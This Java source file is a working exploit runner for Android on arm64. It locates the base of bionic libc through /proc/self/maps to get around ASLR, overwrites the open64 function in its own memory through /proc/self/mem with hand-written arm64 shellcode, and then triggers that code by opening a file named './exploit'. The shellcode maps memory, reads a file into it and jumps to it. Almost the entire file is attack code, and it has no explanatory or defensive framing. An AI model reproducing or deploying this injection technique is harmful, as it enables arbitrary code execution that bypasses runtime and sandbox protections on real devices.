package xyz.cygnusx.runner;

import java.io.BufferedReader;
import java.io.FileInputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.RandomAccessFile;

public class RunnerMain {

    public static void main(String[] args) {

        Long libcbase = null;
        final long OFFSET_CONST = 0x003d000L;
        final long OPENAT_OFFSET = 0x000000000005f800L - OFFSET_CONST; //open64 offset in libc

        // bypass ASLR: find libc base address
        try (BufferedReader br = new BufferedReader(new FileReader("/proc/self/maps"))) {
            String line;
            while ((line = br.readLine()) != null) {
                String[] parts = line.split("\\s+");
                if (line.contains("/apex/com.android.runtime/lib64/bionic/libc.so") && parts[1].startsWith("r-xp")) {
                    libcbase = Long.parseUnsignedLong(parts[0].split("-")[0], 16);
                }
            }
        } catch (IOException e) {
            System.err.println("Failed to read /proc/self/maps: " + e);
            return;
        }


        if (libcbase != null) {
            System.out.printf("libc base address: 0x%x\n", libcbase);
        } else {
            System.out.println("libc base address not found.");
            return;
        }

        long addr = libcbase + OPENAT_OFFSET; //address of open64

        // write shellcode to open64
        try (RandomAccessFile raf = new RandomAccessFile("/proc/self/mem", "rw")) {
            raf.seek(addr);

            /*
            arm64 shellcode to mmap and read to chunk in LITTLE ENDIAN
            */
            byte[] shellcode = new byte[] {
                (byte)0x00, (byte)0x04, (byte)0xA0, (byte)0xD2, // d2a00400
                (byte)0x01, (byte)0x08, (byte)0xA0, (byte)0xD2, // d2a00801
                (byte)0xE2, (byte)0x00, (byte)0x80, (byte)0xD2, // d28000e2
                (byte)0x43, (byte)0x06, (byte)0x80, (byte)0xD2, // d2800643
                (byte)0x04, (byte)0x00, (byte)0x80, (byte)0x92, // 92800004
                (byte)0x05, (byte)0x00, (byte)0x80, (byte)0xD2, // d2800005
                (byte)0xC8, (byte)0x1B, (byte)0x80, (byte)0xD2, // d2801bc8
                (byte)0x01, (byte)0x00, (byte)0x00, (byte)0xD4, // d4000001
                (byte)0xF3, (byte)0x03, (byte)0x00, (byte)0xAA, // aa0003f3
                (byte)0xFF, (byte)0xC3, (byte)0x00, (byte)0xD1, // d100c3ff
                (byte)0xC2, (byte)0xE5, (byte)0x85, (byte)0xD2, // d285e5c2
                (byte)0xA2, (byte)0x0C, (byte)0xAF, (byte)0xF2, // f2af0ca2
                (byte)0x02, (byte)0x8E, (byte)0xCD, (byte)0xF2, // f2cd8e02
                (byte)0xE2, (byte)0x2D, (byte)0xED, (byte)0xF2, // f2ed2de2
                (byte)0xE2, (byte)0x03, (byte)0x00, (byte)0xF9, // f90003e2
                (byte)0x83, (byte)0x0E, (byte)0x80, (byte)0x52, // 52800e83
                (byte)0xE3, (byte)0x0B, (byte)0x00, (byte)0xB9, // b9000be3
                (byte)0xEA, (byte)0x03, (byte)0x00, (byte)0x91, // 910003ea
                (byte)0x60, (byte)0x0C, (byte)0x80, (byte)0x92, // 92800c60
                (byte)0xE1, (byte)0x03, (byte)0x00, (byte)0x91, // 910003e1
                (byte)0x02, (byte)0x00, (byte)0x80, (byte)0xD2, // d2800002
                (byte)0x08, (byte)0x07, (byte)0x80, (byte)0xD2, // d2800708
                (byte)0x01, (byte)0x00, (byte)0x00, (byte)0xD4, // d4000001
                (byte)0xF4, (byte)0x03, (byte)0x00, (byte)0xAA, // aa0003f4
                (byte)0xE0, (byte)0x03, (byte)0x14, (byte)0xAA, // aa1403e0
                (byte)0xE1, (byte)0x03, (byte)0x13, (byte)0xAA, // aa1303e1
                (byte)0x02, (byte)0x00, (byte)0x80, (byte)0xD2, // d2800002
                (byte)0x02, (byte)0x08, (byte)0xA0, (byte)0xF2, // f2a00802
                (byte)0xE8, (byte)0x07, (byte)0x80, (byte)0xD2, // d28007e8
                (byte)0x01, (byte)0x00, (byte)0x00, (byte)0xD4, // d4000001
                (byte)0xFF, (byte)0x03, (byte)0x01, (byte)0xD1, // d10103ff
                (byte)0x20, (byte)0x00, (byte)0x80, (byte)0xD2, // d2800020
                (byte)0xE0, (byte)0x03, (byte)0x00, (byte)0xF9, // f90003e0
                (byte)0xE1, (byte)0x23, (byte)0x00, (byte)0x91, // 910023e1
                (byte)0x2A, (byte)0x00, (byte)0x00, (byte)0xF9, // f900002a
                (byte)0x02, (byte)0x00, (byte)0x80, (byte)0xD2, // d2800002
                (byte)0x22, (byte)0x04, (byte)0x00, (byte)0xF9, // f9000422
                (byte)0x23, (byte)0x40, (byte)0x00, (byte)0x91, // 91004023
                (byte)0x62, (byte)0x00, (byte)0x00, (byte)0xF9, // f9000062
                (byte)0x64, (byte)0x20, (byte)0x00, (byte)0x91, // 91002064
                (byte)0xE5, (byte)0x02, (byte)0x80, (byte)0xD2, // d28002e5
                (byte)0x85, (byte)0x00, (byte)0x00, (byte)0xF9, // f9000085
                (byte)0x06, (byte)0x00, (byte)0x80, (byte)0xD2, // d2800006
                (byte)0x86, (byte)0x04, (byte)0x00, (byte)0xF9, // f9000486
                (byte)0x84, (byte)0x40, (byte)0x00, (byte)0x91, // 91004084
                (byte)0x05, (byte)0x00, (byte)0x80, (byte)0xD2, // d2800005
                (byte)0x85, (byte)0x00, (byte)0x00, (byte)0xF9, // f9000085
                (byte)0x9F, (byte)0x04, (byte)0x00, (byte)0xF9, // f900049f
                (byte)0x73, (byte)0x0E, (byte)0x40, (byte)0xF9, // f9400e73
                (byte)0x20, (byte)0x00, (byte)0x80, (byte)0xD2, // d2800020
                (byte)0xE1, (byte)0x23, (byte)0x00, (byte)0x91, // 910023e1
                (byte)0xDE, (byte)0x03, (byte)0x1E, (byte)0xCB, // cb1e03de
                (byte)0x60, (byte)0x02, (byte)0x1F, (byte)0xD6, // d61f0260
            };

 
            raf.write(shellcode);
        } catch (IOException e) {
            System.err.println("Failed to read /proc/self/mem: " + e);
            return;
        }



        // Invoke open64 via FileInputStream
        try (FileInputStream s = new FileInputStream("./exploit")) {

        } catch (IOException e) {
            System.err.println("sus: " + e);
        }
    }
}
